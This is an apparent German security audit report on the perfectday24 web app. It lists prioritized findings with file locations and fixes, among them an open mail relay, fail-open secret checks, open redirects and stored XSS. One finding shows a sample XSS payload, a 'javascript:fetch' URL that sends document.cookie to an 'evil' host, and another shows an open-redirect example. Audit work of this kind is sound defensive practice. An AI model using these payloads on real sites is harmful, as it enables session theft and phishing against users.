# Security-Audit perfectday24 — 30.07.2026

Codebasis-Audit (read-only) durch zwei unabhängige Prüfpfade: serverseitig (API-Routen, Stripe,
Supabase/RLS, Secrets) und clientseitig (XSS, Redirects, Header, Dependencies). Überschneidende
Funde wurden von beiden Pfaden unabhängig bestätigt — diese sind unten als *doppelt bestätigt*
markiert. Kein Code wurde im Rahmen des Audits geändert.

Stand der geprüften Version: Next.js 16.1.6, Branch `main`, Commit `c8cb69a`.

---

## Kurzfassung

Der klassische XSS-Vektor existiert praktisch nicht (kein `dangerouslySetInnerHTML`, `innerHTML`,
`eval`, `document.write` im App-Code), die Stripe-Integration ist gegen Preismanipulation sauber
gebaut, der Service-Role-Key ist nirgends clientseitig exponiert, und es gibt keine hartcodierten
Secrets. Die realen Risiken liegen woanders: **unauthentifizierte Endpunkte mit
Service-Role-Schreibrechten, ein offener Mail-Relay, zwei fail-open-Prüfungen und komplett
fehlendes Rate-Limiting.**

Zwei Funde sind ohne Vorbedingungen ausnutzbar und sollten vor dem nächsten Deploy geschlossen
werden (P1 unten).

---

## P1 — Vor dem nächsten Deploy schließen

### 1. Offener Mail-Relay + HTML-Injection (doppelt bestätigt)

`app/api/events/inquiries/route.ts:180-192` (Body-Parsing), `:249-264` (Versand), Template `:95-123`

Das `providers`-Array kommt vollständig aus dem Request-Body — inklusive `email`, `name` und `id` —
und wird nie gegen `service_providers` abgeglichen. Die Mail geht direkt an `provider.email`. Zusätzlich
wird das HTML per String-Interpolation gebaut; `customerMessage`, `planTitle` und `cityName` sind
ungeescaped.

**Szenario:** Ein selbst registrierter Nutzer legt einen eigenen `event_plan` an (der Ownership-Check
in `:195-204` besteht damit), postet dann ein `providers`-Array mit fremden Empfängeradressen und
beliebiges HTML in `customerMessage`. Resend verschickt das mit gültigem SPF/DKIM von
`anfragen@perfectday24.de`. Ergebnis: Phishing-Verstärker auf Kosten der Domain-Reputation, dazu
gefälschte `vendor_quotes`-Datensätze.

**Behebung:** Vom Client nur `providerIds: string[]` annehmen; `contact_email` und `name`
serverseitig aus `service_providers` laden (mit Existenz- und Status-Prüfung); alle interpolierten
Werte HTML-escapen; Empfängerzahl pro Request begrenzen; Rate-Limit pro Nutzer.

### 2. `/api/monetization/track` — unauthentifizierter Service-Role-Insert (doppelt bestätigt)

`app/api/monetization/track/route.ts:4-17`, `lib/monetization/server.ts:61-152`

Keine Auth, keine Signatur, keine Validierung außer „`eventType` ist gesetzt". Alle Felder
(`userId`, `partnerProfileId`, `creatorProfileId`, `revenueCents`, `metadata`) werden ungeprüft mit
Service-Role-Rechten in `attribution_events` geschrieben. Bei `eventType: "route_copy"` legt
`maybeCreateCreatorReward` zusätzlich `creator_reward_events` an — die Deduplizierung greift nur
über `route_id` + `source_id` und lässt sich durch Variation von `metadata.sourceRouteSlug`
beliebig oft umgehen.

**Szenario:** Ein Skript fabriziert per Curl-Schleife beliebig viele Reward- und Attributions-Events
auf eigene oder fremde Profil-IDs, inklusive frei gewählter `revenueCents`. Direkter finanzieller
Schaden bei Creator-Auszahlungen und Partner-Abrechnung, dauerhaft unbrauchbare
Monetarisierungsdaten. Dieselbe Lücke betrifft `/api/monetization/redirect:86-107`.

**Behebung:** Session-Auth erzwingen, `userId` aus der Session statt aus dem Body ableiten,
`eventType` gegen Whitelist prüfen, `revenueCents` ausschließlich serverseitig aus Stripe-Events
setzen, Rate-Limit pro Session/IP.

---

## P2 — Kurzfristig

### 3. Affiliate-Postback ist fail-open (doppelt bestätigt)

`app/api/affiliate/postback/[network]/route.ts:55-59`

```ts
if (expectedSecret && providedSecret !== expectedSecret) { /* 401 */ }
```

Ist `AFFILIATE_POSTBACK_SECRET` nicht gesetzt, entfällt die Prüfung vollständig. Das Secret steht
außerdem im Query-String (landet in Access- und Proxy-Logs) und wird nicht timing-safe verglichen.

**Szenario:** Fehlt die Env-Var in einem Preview- oder Branch-Deployment, kann jeder beliebige
Conversions mit frei gewähltem `commission`-Betrag und `status: "approved"` in
`affiliate_conversions` schreiben — fingierte Provisionsansprüche.

**Behebung:** Auf fail-closed umstellen (`if (!expectedSecret || providedSecret !== expectedSecret)`),
Secret per Header statt Query, HMAC über die Payload, `crypto.timingSafeEqual`.

### 4. Kein Rate-Limiting; KI-Routen ohne Auth

Im gesamten Projekt existiert kein Rate-Limiting — kein Upstash/KV, kein 429-Pfad, `proxy.ts`
limitiert nichts.

Betroffene unauthentifizierte KI-Routen: `app/api/events/generate-needs/route.ts:46-70` und
`generate-agenda/route.ts:55-79` (beide Modell `gpt-5.2`, `bookings`-Array unbegrenzt),
`app/api/parse-intent/route.ts:139`, `generate-plan-text/route.ts:43`,
`roadtrip/suggest-stops/route.ts:35`.

Besonders relevant: Das Premium-Gate in `app/api/generate-plan-ai/route.ts:193-219` greift nur,
**wenn ein `Authorization`-Header mitgeschickt wird** — ohne Header kein Gate, bei bis zu 10
LLM-Iterationen mit Tool-Calls pro Request (`MAX_ITER`, `:257`). Der Code-Kommentar in `:193-194`
weist das als bewusste Entscheidung aus („Ohne Auth kein Gate → Marketing/Demo funktioniert
weiter"). Die Konsequenz ist trotzdem, dass `FREE_AI_PLANS_PER_MONTH` durch schlichtes Weglassen
des Tokens umgangen wird. Der `prompt` ist hier immerhin auf 500 Zeichen begrenzt (`:189`), bei den
übrigen Routen fehlt eine Längenbegrenzung.

**Behebung:** Zentrales Rate-Limit in `proxy.ts` für `/api/**` — das entschärft gleichzeitig die
Funde 4, 9, 12 und 13. Dazu Anon-Quota per IP/Fingerprint statt „kein Header, kein Limit", harte
Input-Längen-Caps und ein Budget-Alarm bei OpenAI.

### 5. Next.js 16.1.6 → 16.2.12 (Proxy-Bypass-Advisories)

`package.json:59`

`npm audit --omit=dev`: 3 High, 0 Critical (`next`, `postcss`, `sharp` — alle über die next-Kette,
Fix verfügbar auf Patch-Level, kein SemVer-Major).

Direkt relevant sind die **Middleware-/Proxy-Bypass-Advisories** (GHSA-26hh-7cqf-hhc6,
GHSA-267c-6grr-h53f, GHSA-492v-c6pp-mqqv, GHSA-6gpp-xcg3-4w24) über Segment-Prefetch-Routen und
dynamische Route-Parameter, weil `proxy.ts` bei perfectday24 das echte Zugangs-Gate für den
Preview-Lock ist. Dazu XSS bei CSP-Nonces (GHSA-ffhc-5mcf-pf4q), Cache-Poisoning von
RSC-/Redirect-Responses und DoS über die Image-Optimization-API.

Nicht betroffen: CVE-2025-29927 (Middleware-Auth-Bypass via `x-middleware-subrequest`) — behoben in
14.2.25/15.2.3, 16.1.6 liegt darüber.

**Behebung:** `npm i next@16.2.12 eslint-config-next@16.2.12`, danach Regression-Suite. Zieht
`postcss` und `sharp` mit.

### 6. Moderations-Bypass für Community-Fotos

`supabase/migrations/20260616110000_media_foundation.sql:144-167`,
`components/media/CommunityPhotoSubmission.tsx:385-407`, `lib/media/gallery.ts:49-55`

Der Client schreibt `moderation_status` und `visibility` selbst. Die INSERT-Policy prüft nur
`owner_user_id = auth.uid()`, die UPDATE-Policy erlaubt dem Owner jede Feldänderung — beide
schränken diese zwei Felder nicht ein. Der Lesepfad filtert nicht zusätzlich, sondern verlässt sich
allein auf `media_assets_select_public`.

**Szenario:** Ein registrierter Nutzer ruft mit dem Anon-Key direkt die Supabase-REST-API auf und
setzt `moderation_status: "featured"`. Kombiniert mit `route_media_insert_contributor_public`
(Migration `20260617143000`, erlaubt Anhängen an jede public/unlisted Route) erscheint beliebiges
Bildmaterial ungeprüft auf fremden Routen- und Event-Seiten. Der Auto-Safety-Hold in
`app/api/media/report/route.ts:150-167` lässt sich auf demselben Weg zurücksetzen.

**Behebung:** INSERT-Policy um `and moderation_status = 'submitted' and visibility <> 'public'`
ergänzen; Statuswechsel nur über Admin-Rolle bzw. Service-Role-Route; Owner-UPDATE auf `caption`
und `credit_name` beschränken; im Lesepfad zusätzlich explizit auf `approved|featured` filtern.

*Positiv:* Die Datei-Validierung ist nicht nur clientseitig — der Bucket erzwingt
`allowed_mime_types` und `file_size_limit = 10 MB` (`:5-17`), passend zu den Client-Konstanten.

---

## P3 — Mittelfristig

### 7. Zwei Open Redirects (doppelt bestätigt)

`app/profile/page.tsx:310` liest `?return=` und übergibt den Wert ungeprüft an `router.replace`
(`:445`, `:1048`) sowie an `redirectTo` der OAuth-Anfrage (`:927`). Ein Nutzer klickt einen Link mit
vertrauter Domain, loggt sich per Google ein und landet direkt auf einer Angreiferseite, die einen
„erneuten Login" fordert. Die korrekte Implementierung existiert im Repo bereits:
`getSafeReturnPath()` in `app/api/preview-login/route.ts:9-15`.

`app/api/monetization/redirect/route.ts:49-65` prüft das Protokoll korrekt (blockt `javascript:` und
`data:`), aber es gibt keine Host-Allowlist — `?target=https://evil.example` funktioniert. Der Link
erbt die Domain-Reputation und umgeht Link-Filter.

**Behebung:** Für `?return=` nur `startsWith("/") && !startsWith("//")` zulassen. Für die
Redirect-Route die Ziel-URL serverseitig aus `affiliate_links`/`partner_campaigns` auflösen (statt
`target` roh zu akzeptieren) oder mindestens eine Host-Allowlist.

### 8. Ungeprüfte URLs aus Profil- und Partnerdaten → Stored XSS (doppelt bestätigt)

Render-Pfad: `app/creator/[username]/page.tsx:703` → `:928` (`<a href={link.href}>`).
Schreibpfade ohne Validierung: `app/partner/dashboard/page.tsx:706-707`,
`app/partner/onboarding/page.tsx:288-289` (nur `.trim()`),
`app/api/partner/affiliate-links/route.ts:34` (`destination_url`),
`app/api/partner/campaigns/route.ts:45` (`cta_url`).

**Szenario:** Ein Creator setzt `website_url = javascript:fetch('https://evil…?c='+document.cookie)`.
Jeder Besucher der öffentlichen Profilseite, der auf „Website" klickt, führt das im
perfectday24-Origin aus. Die Supabase-Session liegt in Cookies (`lib/supabaseClient.ts:14-17`) und
ist per JS lesbar.

**Behebung:** `cleanUrl()` aus `components/ImageAttribution.tsx:28-31` — die vorhandene
Referenzimplementierung — nach `lib/safe-url.ts` heben und beim Schreiben **und** Rendern anwenden.
Deckt zusammen mit Fund 7 einen gemeinsamen Helper ab.

*Positiv:* Alle übrigen extern gespeisten Links sind sauber, weil `MonetizedExternalLink`
(`components/monetization/MonetizedExternalLink.tsx:33-77`) über die protokollvalidierende
Redirect-Route leitet.

### 9. Preview-Lock: Bypass über Dateiendungs-Heuristik + kein Brute-Force-Schutz

`proxy.ts:24` markiert mit `/\.[a-zA-Z0-9]+$/` **jeden** Pfad mit einem Punkt im letzten Segment als
öffentlich. Bei aktivem Site-Lock erreicht ein Angreifer dynamische Seiten über Slugs mit Punkt
(z. B. `/routes/x.html`, `/explore/berlin.json`) ohne Passwort.

Dazu `lib/preview-lock.ts:80-82`: Der Passwortvergleich ist nicht timing-safe, und es gibt keinen
Versuchszähler. Ist `SITE_PREVIEW_COOKIE_SECRET` nicht gesetzt, wird laut `:8` das Passwort selbst
als HMAC-Secret verwendet.

**Behebung:** Explizite Endungs-Allowlist statt Regex, und nur für Asset-Präfixe.
`crypto.timingSafeEqual`, Lockout pro IP, separates Cookie-Secret erzwingen.

### 10. Fehlende Security-Header

`next.config.ts` hat keine `headers()`-Funktion, `vercel.json` nur `git.deploymentEnabled`,
`proxy.ts` setzt keine Header. Es fehlen also CSP, HSTS, X-Frame-Options, Referrer-Policy und
Permissions-Policy vollständig.

Konkrete Folge: Ohne `frame-ancestors`/`X-Frame-Options` ist Clickjacking auf Partner- und
Checkout-Flows möglich. Ohne `Referrer-Policy` leaken Share-Token-URLs (`/p/{token}`) über den
Referer an externe Affiliate-Ziele — wegen `/api/monetization/redirect` ein konkreter Pfad zu
Fremdservern. Ohne CSP hat jede künftige Injection sofort volle Script-Wirkung.

**Behebung:** `headers()` in `next.config.ts` mit `Strict-Transport-Security`,
`X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`,
`Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy` (Geolocation wird genutzt →
`self`). CSP zunächst als `Content-Security-Policy-Report-Only` einführen (Leaflet-, Stripe- und
Supabase-Origins beachten). Dazu `poweredByHeader: false`.

### 11. Auto-Admin-Fallback

`lib/monetization/admin-server.ts:298-312`

Ist keine Allowlist konfiguriert, gilt außerhalb `NODE_ENV === "production"` jeder eingeloggte
Nutzer als Monetization-Admin — mit Zugriff auf `getMonetizationAdminSnapshot()` (kompletter
Partner-, Attribution- und Media-Datenbestand über Service-Role) und den PATCH-Endpoint
(`app/api/monetization/admin/route.ts:61`).

**Szenario:** In einem Staging- oder Self-hosted-Build ohne gesetzte `PD24_INTERNAL_ADMIN_*` reicht
eine normale Registrierung, um Partner-Reviews zu publishen und Medien zu moderieren.

**Behebung:** Fallback entfernen — ohne Allowlist immer `misconfigured`.

### 12. Konfigurations-Leak über Health-Endpoints (doppelt bestätigt)

`app/api/health/config/route.ts:7-20` ist unauthentifiziert abrufbar und verrät, welche Secrets
gesetzt sind, ob `SITE_LOCK_ENABLED` aktiv ist und ob `SITE_PREVIEW_PASSWORD` /
`SITE_PREVIEW_COOKIE_SECRET` existieren. `app/api/health/openai/route.ts:9-10` gibt zusätzlich
`keyPrefix` aus.

**Szenario:** Reconnaissance — ein Angreifer erkennt vor dem ersten Versuch, ob Fail-open-Zustände
(Fund 3) oder Fehlkonfigurationen (Fund 9) vorliegen, und wählt den Vektor gezielt.

**Behebung:** Hinter die Admin-Allowlist legen oder in Produktion auf `{ ok: true }` reduzieren.

### 13. Zwei DoS-taugliche unauthentifizierte DB-Queries

`app/api/geocode/search/route.ts:634` und `:665` nutzen `.ilike("name", "%${q}%")` mit
unbegrenzt langem, unbereinigtem `q`. Kein klassisches SQL-Injection (PostgREST parametrisiert),
aber `%`, `_`, `,`, `(`, `)` wirken als Wildcards bzw. beeinflussen den Filterausdruck. `q=%`
erzwingt Full-Table-Scans über `locations`.

`app/api/monetization/public-affiliates/route.ts:10-19` nimmt `locationIds`, `plannerEventIds` und
`routeIds` ohne Längen- oder UUID-Prüfung in eine Service-Role-Query — ein Request mit 100.000 IDs
erzeugt entsprechende DB-Last und erlaubt die Enumeration aller aktiven Affiliate-Ziele.

**Behebung:** Filter-Sonderzeichen escapen, `q` auf ~64 Zeichen begrenzen, ID-Listen auf ~50
Einträge cappen und UUID-Format prüfen. Rate-Limit (siehe Fund 4) deckt beides mit ab.

---

## P4 — Niedrig / Hygiene

**14. Fehlende Rollen-Granularität in Partner-Routen.** `lib/partner/api-auth.ts:23-38` nimmt die
neueste aktive Membership und prüft **keine** Rolle. Ein Membership mit Rolle `member` darf damit
Kampagnen und Affiliate-Links löschen (`app/api/partner/campaigns/[id]/route.ts:79`,
`affiliate-links/[id]/route.ts:75`). Korrektes Gegenbeispiel im Repo:
`app/api/stripe/create-checkout/route.ts:74` prüft `role in ("owner","admin")`.

**15. PII in Logs, interne Fehlerdetails an Clients.**
`app/api/stripe/create-checkout/route.ts:136` loggt den vollständigen Checkout-Payload inklusive
`user_id` und E-Mail; `:144` gibt `detail: String(err)` an den Client. Ebenso
`app/api/monetization/admin/route.ts:378-383`, `app/api/geocode/search/route.ts:765` und die
`app/api/partner/*`-Routen (DB-`error.message` nach außen).

**16. Stripe-Webhook verifiziert `metadata.user_id` nicht gegen den Customer.**
`app/api/stripe/webhook/route.ts:26-52`, `:148-166`. Signaturprüfung und Metadata-Herkunft sind
korrekt; Restrisiko: Wer über eine zweite Integration oder Dashboard-Zugriff Metadata setzen kann,
schreibt `is_premium` auf eine fremde `user_id`. Behebung: `user_id` gegen
`profiles.stripe_customer_id` des Abos prüfen.

**17. Vier Tabellen ohne RLS in den Migrationen.** Von 70 per `create table` angelegten Tabellen
fehlt `enable row level security` bei `location_features`, `location_manual_seeds`,
`location_source_data` und `location_subtype_catalog`. Kein `DISABLE ROW LEVEL SECURITY` im Repo.
**Achtung:** Wegen der bekannten Schema-Drift zwischen Repo-Migrationen und Live-DB muss der
tatsächliche Zustand separat per `pg_tables.rowsecurity` geprüft werden.

**18. `images.remotePatterns` mit offenen UGC-Hosts.** `next.config.ts:7-67` — keine Wildcards,
`dangerouslyAllowSVG: false`, Supabase-Pattern korrekt begrenzt. Aber `i.imgur.com`,
`res.cloudinary.com`, `cdn.pixabay.com`, `images.pexels.com` und `upload.wikimedia.org` sind ohne
`pathname`-Einschränkung freigegeben — nutzbar als kostenloser Bild-Proxy und als Cache-Last-Hebel.
Das next-Update (Fund 5) behebt die Cache-/DoS-Seite; zusätzlich `minimumCacheTTL` und engere
`pathname`-Muster setzen.

**19. Personenbezogene Daten im localStorage ohne Löschfrist.** Keine Auth-Tokens im Web-Storage
(Session liegt bewusst in Cookies), Tracking-IDs sind korrekt consent-gated. Ohne Consent-Bezug
persistieren aber: `pd24_start_point` (Adress-Label + Koordinaten,
`app/planner/usePlannerStartPoint.ts:67`) sowie `pd24_group_invites` / `pd24_group_import`
(Klarnamen und Interessen Dritter, `lib/social/planner-group.ts:24`, `lib/social/groups.ts:28`).
Diese Daten dürften als für die Kernfunktion erforderlich einzuordnen sein und brauchen daher keine
Einwilligung — es fehlt aber eine Löschmöglichkeit. Empfehlung: „Lokale Daten löschen"-Aktion im
Profil, Koordinaten auf die benötigte Präzision runden, TTL beim Lesen prüfen.

---

## Als sauber verifiziert

- **Kein XSS-Vektor im App-Code.** Kein `dangerouslySetInnerHTML`, `innerHTML`, `eval`,
  `new Function` oder `document.write` in `app/`, `components/`, `lib/`.
- **Stripe-Preise kommen nie vom Client.** `create-checkout/route.ts:117` und
  `user-checkout/route.ts:88` verwenden ausschließlich `plan.priceId` aus `STRIPE_PLANS` (Env). Der
  Tier wird im Webhook über `getTierForPriceId(priceId)` aus der Stripe-Subscription abgeleitet
  (`webhook/route.ts:74-75`). Preismanipulation ist nicht möglich.
- **Webhook-Signaturprüfung korrekt und fail-closed.** `webhook/route.ts:196-213`: fehlender Header
  → 400, fehlendes `STRIPE_WEBHOOK_SECRET` → 500 (kein Bypass), `constructEvent` über den Raw-Body.
- **Service-Role-Key nirgends clientseitig.** `lib/supabaseClient.ts:17` nutzt nur den Anon-Key.
  Alle 76 `SUPABASE_SERVICE_ROLE`-Treffer liegen in Route-Handlern, `lib/*-server.ts` oder
  `scripts/`. Die einzigen `NEXT_PUBLIC_*`-Variablen enthalten keine Secrets.
- **Keine hartcodierten Secrets.** Suche nach JWT-, `sk-proj-`, `sk_live_`, `whsec_` und
  `AIza`-Mustern außerhalb von `node_modules`/`.next`: null Treffer.
- **Keine `.env` in git.** Nur `.env.example` mit leeren Werten ist getrackt; `.gitignore:9-11` ist
  korrekt, `.env.local` existiert lokal und ist nicht im Index.
- **IDOR in allen Partner-Routen abgesichert.** Durchgängig `.eq("partner_profile_id", …)` vor
  Update und Delete (`providers/[id]:47`, `packages/[pkgId]:49`, `campaigns/[id]:30,74`,
  `affiliate-links/[id]:28,70`, `review:33,42,50`).
- **`book-quote` korrekt.** Preis stammt aus `vendor_quotes.price_cents` (DB), Ownership über
  `event_inquiries.customer_id === user.id` doppelt geprüft (`book-quote/route.ts:46-61`).
- **Upload-Validierung serverseitig erzwungen,** nicht nur im Client (siehe Fund 6).
- **CVE-2025-29927 nicht betroffen** (Next 16.1.6 > 15.2.3).

---

## Empfohlene Reihenfolge

1. **Fund 1 und 2** — aktiv ausnutzbar, direkter Schaden an Domain-Reputation und Abrechnungsdaten.
   Beide in überschaubarem Umfang behebbar.
2. **Fund 3** (fail-open Geld-Endpoint) und **Fund 5** (`npm i next@16.2.12` — ein Patch-Update,
   entschärft Proxy-Bypass, `postcss` und `sharp` gleichzeitig).
3. **Fund 4** — ein zentrales Rate-Limit in `proxy.ts` für `/api/**` entschärft gleichzeitig 9, 12
   und 13.
4. **Fund 6** (RLS-Policies), dann **Fund 7 und 8** — ein gemeinsamer `lib/safe-url.ts`-Helper deckt
   beide ab.
5. **Fund 10** (Security-Header) und der Rest nach Kapazität.
